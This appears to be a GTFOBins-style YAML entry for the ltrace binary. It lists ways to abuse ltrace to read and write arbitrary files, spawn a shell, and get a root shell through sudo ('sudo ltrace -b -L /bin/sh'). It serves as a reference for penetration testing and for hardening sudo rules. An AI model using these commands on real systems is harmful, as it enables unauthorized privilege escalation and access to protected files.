---
functions:
  file-read:
    - description: The file is parsed as a configuration file and its content is shown as error messages, thus this is not suitable to exfiltrate binary files.
      code: |
        LFILE=file_to_read
        ltrace -F $LFILE /dev/null
  file-write:
    - description: The data to be written appears amid the library function call log, quoted and with special characters escaped in octal notation. The string representation will be truncated, pick a value big enough. More generally, any binary that executes whatever library function call passing arbitrary data can be used in place of `ltrace -F DATA`.
      code: |
        LFILE=file_to_write
        ltrace -s 999 -o $LFILE ltrace -F DATA
  shell:
    - code: ltrace -b -L /bin/sh
  sudo:
    - code: sudo ltrace -b -L /bin/sh
---
